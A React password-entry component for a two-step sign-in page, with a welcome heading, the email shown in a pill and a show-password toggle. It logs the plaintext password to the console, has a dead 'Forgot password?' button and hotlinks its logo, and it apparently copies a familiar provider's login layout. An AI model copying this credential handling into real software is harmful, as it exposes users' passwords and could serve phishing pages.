import { useState} from "react";
import "./SignIn.css";

function PasswordStep({ email, userId, onComplete }) {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoader, setShowLoader] = useState(false);



 const handleSubmit = (e) => {
  e.preventDefault();

  if (!password.trim()) return;

  console.log("Current user ID:", userId);
  console.log("Current password:", password.trim());
    setShowLoader(true);

  if (onComplete) {
      setTimeout(() => {
         onComplete(userId, password.trim());
      setShowLoader(false);
    }, 2000);
   
  }
};



const handleBack =
    () => {


   

    window.location.href = "/"


      



     

      setShowPassword(false);

    };


  return (
    <div className="signin-page">

      <div className="signin-card ">

        {showLoader && (
           <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        )}

        <div className="password-left">

           <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1 className="signin-title">
            Welcome
          </h1>

          <div className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-email">
              {email}
            </span> 
              <button
                  type="button"
                  onClick={handleBack}
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>

        <div className="password-right">

      

          <form onSubmit={handleSubmit}>

            <div className="password-input-container">

              <input
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                
                onChange={(e) => setPassword(e.target.value)}
                placeholder=" "
                autoComplete="off"
              />

              <label htmlFor="password">
                Enter your password
              </label>

            </div>

            <label className="show-password">
              <input
                type="checkbox"
                checked={showPassword}
                onChange={(e) =>
                  setShowPassword(e.target.checked)
                }
              />

              <span>Show password</span>
            </label>

            <div className="password-actions">

              <button
                type="button"
                className="text-button"
              >
                Forgot password?
              </button>

              <button
                type="submit"
                className="next-button"
                disabled={!password.trim()}
              >
                Next
              </button>

            </div>

          </form>

        </div>

      </div>

    </div>
  );
}

export default PasswordStep;